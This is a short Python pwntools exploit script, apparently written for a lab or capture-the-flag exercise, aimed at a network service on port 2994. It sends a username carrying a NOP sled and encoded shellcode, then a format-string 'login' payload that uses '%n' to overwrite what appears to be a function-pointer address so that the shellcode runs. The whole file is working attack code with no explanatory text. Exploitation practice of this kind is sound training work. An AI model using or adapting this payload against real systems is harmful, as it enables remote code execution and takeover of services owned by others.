from pwn import *
import struct


HOST = "192.168.206.132"
PORT = 2994


def user(username, conn):
    conn.send("username " + username + '\n')


def passwd(password, conn):
    conn.send("login " + password + '\n')


# username @ 0x0804a220
# To calculate the offset to password on the stack, do 22 + ((len(username)-3) / 4).

def main():
    conn = remote(HOST, PORT)
    printf = struct.pack("<I", 0x0804a194)
    username = "\x90"*10 + "\xdd\xc1\xbd\x06\x97\x23\xe5\xd9\x74\x24\xf4\x5a\x31\xc9\xb1\x14\x83\xea\xfc\x31\x6a\x15\x03\x6a\x15\xe4\x62\x12\x3e\x1f\x6f\x06\x83\x8c\x1a\xab\x8a\xd3\x6b\xcd\x41\x93\xd7\x4c\x08\xfb\xe5\x70\xbd\xa7\x83\x60\xec\x07\xdd\x60\x64\xc1\x85\xaf\xf9\x84\x77\x34\x49\x92\xc7\x52\x60\x1a\x64\x2b\x1c\xd7\xeb\xd8\xb8\x8d\xd4\x86\xf7\xd1\x62\x4e\xf0\xb9\x5b\x9f\x73\x51\xcc\xf0\x11\xc8\x62\x86\x35\x5a\x28\x11\x58\xea\xc5\xec\x1b"
    password_offset = 22 + ((len(username)-3)//4)
    password = "AAA" + printf + "%-134521200x" + '%' +  str(password_offset) + "$n"

    log.info("Username length: " + str(len(username)))
    user(username, conn)
    passwd(password , conn)

    log.info("Payload sent. Check /var/log/syslog.")

    conn.close()


if __name__ == "__main__":
    main()

